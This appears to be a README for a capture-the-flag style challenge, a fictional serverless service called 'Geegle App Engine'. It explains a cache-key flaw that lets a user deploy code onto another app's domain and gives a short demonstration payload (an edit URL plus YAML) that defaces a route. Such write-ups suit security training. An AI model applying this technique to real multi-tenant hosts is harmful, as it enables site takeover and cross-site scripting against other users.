# gae (Geegle App Engine)

Like Amazon Lambda. Deploy your website without worrying about VM/containers.

To use this infra, you only need to submit short pieces of code for python functions, see the following example.

The environment is sandboxed.

**Feel free to write other services using this infra**

## How-To

Example deploy:
```
---
urls:
  "/": |-
    gae_rsp = gaeutils.make_response("Hello World")
  "/ping": |-
    gae_rsp = gaeutils.make_response("Pong")
  "/add": |-
    num_a = int(request['args'].get("a"))
    num_b = int(request['args'].get("b"))
    gae_rsp = gaeutils.make_response("Answer is " + str(num_a + num_b))
  "/error": |-
    gae_rsp = gaeutils.errorpage("Oops our server has fallen asleep")
  "/redirect": |-
    gae_rsp = gaeutils.redirect("https://www.adamyi.com/")
  "/json": |-
    gae_rsp = gaeutils.make_response(gaeutils.json_encode({"json": "is_easy"}))
default_handler: |-
  gae_rsp = gaeutils.errorpage("The requested URL %s was not found on this server." % request['path'], code=404)
```

## Vulnerability

Could deploy functions to any domains due to wrong caching rules.

**Please test if there are any other unintended vulns (user authentication is yet to add, main focus: bypass sandbox, DoS)**

**Normal User**
Domain: example
Path: helloworld

Cache Key: example.apps.geegle.org/helloworld

**Hacker**
Domain: example.apps.geegle.org/haha
Path: lmao

Cache Key: example.apps.geegle.org/haha.apps.geegle.org/lmao

**This would make XSS possible on all GAE apps**

## Payload

Visit http://manage.apps.geegle.org:8056/edit?app=test1.apps.geegle.org:8056/haha

```
---
urls:
  "/test": |-
    gae_rsp = gaeutils.make_response("hacked")
default_handler: |-
  gae_rsp = gaeutils.errorpage("The requested URL %s was not found on this server." % request['path'], code=404)
```

http://test1.apps.geegle.org:8056/haha.apps.geegle.org:8056/test becomes hacked

## author
adamyi
